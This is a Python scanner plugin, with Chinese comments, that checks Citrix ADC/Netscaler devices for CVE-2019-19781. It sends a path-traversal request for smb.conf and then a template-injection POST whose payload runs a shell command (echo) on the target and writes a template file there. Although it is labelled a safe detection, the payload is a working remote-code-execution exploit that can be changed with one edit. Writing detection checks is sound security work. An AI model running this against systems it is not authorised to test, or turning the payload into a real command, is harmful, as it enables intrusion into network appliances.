import requests
import random
import string
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CitrixVulnerability:
    name = "Citrix ADC/Netscaler 远程代码执行漏洞 (CVE-2019-19781)"
    description = "检测Citrix应用交付控制器和网关设备的模板注入漏洞"
    author = "安全研究团队"
    group = "网络设备"
    severity = "高危"

    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.timeout = 15

    def check(self, target):
        """
        安全检测Citrix设备是否存在CVE-2019-19781漏洞
        :param target: 目标URL (如 https://example.com)
        :return: (bool, str) 漏洞存在性和详细结果
        """
        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        try:
            # 生成随机标识符防止冲突
            random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            test_string = f"citrix_test_{random_id}"
            
            # 第一阶段：验证路径遍历漏洞
            traversal_url = f"{target.rstrip('/')}/vpn/../vpns/cfg/smb.conf"
            try:
                resp = self.session.get(traversal_url, timeout=self.timeout)
                if resp.status_code == 200 and "[global]" in resp.text:
                    return True, f"[{self.name}] 目标 {target} 存在目录遍历漏洞（可访问敏感文件）"
            except requests.RequestException:
                pass

            # 第二阶段：安全验证模板注入（不执行实际命令）
            template_url = f"{target.rstrip('/')}/vpn/../vpns/portal/scripts/newbm.pl"
            headers = {
                "NSC_USER": f"../../../../netscaler/portal/templates/{test_string}",
                "NSC_NONCE": "c",
                "Connection": "close"
            }
            payload = {
                "url": "http://example.com",
                "title": f"[%t=template.new({{'BLOCK'='print `echo {test_string}`'}})%][%t%]",
                "desc": "安全检测",
                "UI_inuse": "RfWeb"
            }

            # 发送测试请求
            resp = self.session.post(
                template_url,
                headers=headers,
                data=payload,
                timeout=self.timeout
            )

            if resp.status_code != 200:
                return False, f"[{self.name}] 目标 {target} 未发现漏洞（HTTP {resp.status_code}）"

            # 验证模板是否创建成功
            verify_url = f"{target.rstrip('/')}/vpns/portal/{test_string}.xml"
            verify_resp = self.session.get(verify_url, headers=headers, timeout=self.timeout)

            if verify_resp.status_code == 200 and test_string in verify_resp.text:
                return True, f"[{self.name}] 目标 {target} 存在模板注入漏洞（可执行命令）"
            
            return False, f"[{self.name}] 目标 {target} 未发现漏洞"

        except requests.Timeout:
            return False, f"[{self.name}] 目标 {target} 检测超时"
        except requests.SSLError:
            return False, f"[{self.name}] 目标 {target} SSL证书错误"
        except Exception as e:
            return False, f"[{self.name}] 目标 {target} 检测异常: {str(e)}"